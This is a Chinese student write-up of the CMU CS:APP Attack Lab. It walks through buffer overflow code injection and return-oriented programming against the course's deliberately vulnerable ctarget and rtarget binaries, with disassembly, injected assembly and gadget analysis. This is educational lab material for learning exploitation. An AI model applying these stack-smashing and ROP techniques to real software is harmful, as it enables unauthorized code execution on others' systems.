# 实验 3  Attack Lab

## 实验说明

本实验要求在两个有着不同安全漏洞的程序上实现五次攻击，包括以下五个文件：

`ctarget`：一个容易遭受code injection攻击的可执行程序。 

`rtarget`：一个容易遭受return-oriented programming攻击的可执行程序。 

`cookie.txt`：一个8位的十六进制码，用于验证身份的唯一标识符。 

`farm.c`：目标“gadget farm”的源代码，用于产生return-oriented programming攻击。

`hex2raw`：一个生成攻击字符串的工具。

[Writeup（CMU官网实验说明、部分函数C代码等）](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

## 实验辅助

- **`hex2raw`的使用说明**

  要求输入是一个十六进制格式的字符串，用两个十六进制数字表示一个字节值，字节值之间以空白符（空格或新行）分隔，注意使用小端法字节序。

  将攻击字符串存入文件中，如`attack.txt`，然后用下述方法调用：  
  1.`cat attack.txt | ./hex2raw | ./ctarget`  
  2.`./hex2raw <attack.txt> attackraw.txt`  
  `./ctarget < attackraw.txt` 或 `./ctarget -i attackraw.txt`  
  3.结合gdb使用  
  `./hex2raw <attack.txt> attackraw.txt`  
  `gdb ctarget`  
  `(gdb) run < attackraw.txt` 或 `(gdb) run -i attackraw.txt`

- **生成字节代码操作**

  编写一个汇编文件：
  `vim attack.s`  
  汇编和反汇编此文件：
  `gcc -c attack.s`
  `objdump -d attack.o > attack.d`  
  由此推出这段代码的字节序列。

- **涉及的gdb命令**

  `(gdb) r` run的简写，运行被调试的程序。若有断点，则程序暂停在第一个可用断点处。  
  `(gdb) c` continue的简写，继续执行被调试程序，直至下一个断点或程序结束。    
  `(gdb) print <指定变量>` 显示指定变量的值。  
  `(gdb) break *<代码地址>` 设置断点。  
  `(gdb) x/<n/f/u> <addr>` examine的简写，查看内存地址中的值。
  
- **两个目标文件运行时的参数**

  `-q` 不发送成绩  
  `-i` 从文件中输入  
  自学者需使用`-q`参数避免报错。

## Part 1

### Level 1

**汇编代码分析：**

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp    #栈空间40字节
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets> #读取输入字符串
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt> #输出提示字符串
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate> #攻击有效
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

**要求：**

输入字符串填充栈空间40字节并向下继续覆盖`getbuf`返回地址凭借`ret`指令将控制转移给`touch1`。

**答案：**

按要求思路编写`attack1.txt`，
调用`hex2raw`并执行`ctarget`： 
`./hex2raw < attack1.txt > attackraw1.txt` 
`./ctarget -qi attack1x.txt` 

### Level 2

**汇编代码分析：**

```assembly
00000000004017a8 <getbuf>:
  ...

00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38> #%edi的值需要与cookie相等
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

**要求：**

利用输入的字符串携带指令实现修改寄存器%edi的值，使之与`cookie`相等，随后将控制转移给`touch2`。

**答案：**

首先编写修改寄存器值并转移控制的汇编代码（`asm2.s`），这是攻击字符串的第一部分：

```assembly
movq  $0x59b997fa,%rdi  #设置参数
pushq $0x4017ec         #转移控制
ret
```

获取其对应机器代码：

```
gcc -c asm2.s -o 2.o
objdump -d 2.o > 2.txt
```

整合机器代码、填充及返回地址覆盖（<u>%rsp，Gets后设置断点检查寄存器获得</u>），得到`attack2.txt`，调用`hex2raw`得到`attack2x.txt`实现攻击。

### Level 3

**汇编代码分析：**

```assembly
00000000004017a8 <getbuf>:
  ...

000000000040184c <hexmatch>:
  ...
#Writeup中说明此函数功能为比较参数（%rdi）【无符号整型转换为16进制字符串】与cookie是否相同。

00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch> #比较
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
```

**要求：**

 程序执行完`getbuf`后，执行`touch3`，而`touch3`的参数是对应`cookie`的字符串的地址。 

**答案：**

首先将`cookie`转换为字符串（利用 `man ascii`）：`59b997fa =>  |35|39|62|39|39|37|66|61|\0` ；

编写汇编指令部分（将%rdi的值设置为字符串地址，转移控制，与Level 2类似）：

```assembly
movq  $0x5561dca8,%rdi #%rsp+48（40字节buf，8字节ret地址）
pushq $0x4018fa        #转移控制至touch3
ret
```

由于调用`hexmatch`时需在栈中划分100字节左右的空间，为避免被覆盖，字符串必须放在`ret`地址后（类似于Level 2，`ret`地址指向栈顶，用于执行输入的指令）。

最终攻击字符串见`attack3.txt`、`attack3x.txt`。

## Part 2

### Level 4

**可能用到的gadget：**

```assembly
000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   
#0x40199d:90 90 c3 => nop  nop  ret

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   
#0x4019a2:48 89 c7 c3 => movq %rax,%rdi  ret

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
#0x4019ab:58 90 c3 => popq %rax  nop  ret

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   
#不可行

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   
#不可行

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   
#不可行

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
#0x4019c5:48 89 c7 90 c3 => movq %rax,%rdi  nop  ret

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
#0x4019cc:58 90 c3 => popq %rax  nop  ret
```

**方案：**

联合利用`addval_273`、`addval_219`修改%rdi，利用`ret`转移控制，从栈中取跳转地址。

**答案：**

见`attack4.txt`、`attack4x.txt`。

### Level 5

**待补充**

## 参考文章

[CSAPP：Attack Lab —— 缓冲区溢出攻击实验](https://blog.csdn.net/qq_36894564/article/details/72863319)

[深入理解计算机系统attack lab](https://blog.csdn.net/weixin_41256413/article/details/80463280)
